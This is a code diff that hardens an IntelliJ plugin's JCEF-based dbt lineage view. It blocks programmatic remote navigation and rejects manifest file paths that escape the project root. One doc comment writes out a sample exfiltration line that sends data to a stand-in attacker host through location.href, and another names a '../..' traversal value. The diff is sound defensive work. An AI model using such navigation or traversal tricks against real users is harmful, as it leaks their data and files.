@@ -24,9 +24,13 @@ import com.intellij.ui.jcef.JBCefBrowser
 import com.intellij.ui.jcef.JBCefBrowserBase
 import com.intellij.ui.jcef.JBCefJSQuery
 import com.intellij.ide.ui.LafManagerListener
+import com.intellij.ide.BrowserUtil
 import org.cef.browser.CefBrowser
 import org.cef.handler.CefLoadHandlerAdapter
+import org.cef.handler.CefRequestHandlerAdapter
+import org.cef.network.CefRequest
 import java.awt.BorderLayout
+import java.io.File
 import java.util.Base64
 import javax.swing.JPanel
 import javax.swing.UIManager
@@ -60,6 +64,7 @@ class LineageTab(private val project: Project, private val parentDisposable: Dis
 
         setupJsBridge()
         setupLoadHandler()
+        setupRequestHandler()
         loadHtml()
 
         val connection = project.messageBus.connect(this)
@@ -162,6 +167,40 @@ class LineageTab(private val project: Project, private val parentDisposable: Dis
                     currentModelId?.let { pushDocsToSidebar(it) }
                     pushRegenerateAttention()
                 }
+            }
+        }, browser.cefBrowser)
+    }
+
+    /**
+     * Defense-in-depth against navigation-based exfiltration. The lineage view is a single
+     * in-memory document (loadHTML) that never legitimately navigates the main frame after the
+     * initial load. CSP already blocks fetch/XHR/WebSocket/beacon and remote images, but CSP does
+     * not stop top-level navigation (e.g. `location.href='https://attacker/?'+data`). This handler
+     * cancels any remote-scheme navigation once the page is ready and routes genuine user link
+     * clicks to the system browser instead of loading them in-view.
+     */
+    private fun setupRequestHandler() {
+        browser.jbCefClient.addRequestHandler(object : CefRequestHandlerAdapter() {
+            override fun onBeforeBrowse(
+                cefBrowser: CefBrowser?,
+                frame: org.cef.browser.CefFrame?,
+                request: CefRequest?,
+                userGesture: Boolean,
+                isRedirect: Boolean
+            ): Boolean {
+                val url = request?.url ?: return false
+                // Allow the initial in-memory document load; the SPA never navigates afterward.
+                if (!isPageReady) return false
+                val lower = url.lowercase()
+                val isRemote = lower.startsWith("http://") || lower.startsWith("https://") ||
+                    lower.startsWith("ftp:") || lower.startsWith("ws:") || lower.startsWith("wss:")
+                if (!isRemote) return false
+                // A real click on an external link opens in the OS browser; programmatic
+                // navigation (no user gesture) is silently blocked.
+                if (userGesture && (lower.startsWith("http://") || lower.startsWith("https://"))) {
+                    BrowserUtil.browse(url)
+                }
+                return true // cancel in-view navigation
             }
         }, browser.cefBrowser)
     }
@@ -315,8 +354,22 @@ class LineageTab(private val project: Project, private val parentDisposable: Dis
                 else -> index.nodes[nodeId]?.originalFilePath
             } ?: return@invokeLater
 
-            val fullPath = "${dbtRoot.path}/$filePath"
-            val vFile = LocalFileSystem.getInstance().findFileByPath(fullPath) ?: return@invokeLater
+            // filePath comes from the manifest (attacker-influenced for a repo the user did not
+            // write). Canonicalize and confirm it stays within the dbt project root before opening,
+            // so a crafted "../.." originalFilePath cannot open arbitrary files in the editor.
+            val target = try {
+                val rootFile = File(dbtRoot.path).canonicalFile
+                val candidate = File(rootFile, filePath).canonicalFile
+                if (candidate != rootFile && !candidate.path.startsWith(rootFile.path + File.separator)) {
+                    logger.warn("Refusing to open file outside dbt project root: $filePath")
+                    return@invokeLater
+                }
+                candidate
+            } catch (e: Exception) {
+                logger.warn("Could not resolve file path from manifest", e)
+                return@invokeLater
+            }
+            val vFile = LocalFileSystem.getInstance().findFileByPath(target.path) ?: return@invokeLater
             FileEditorManager.getInstance(project).openFile(vFile, true)
         }
     }
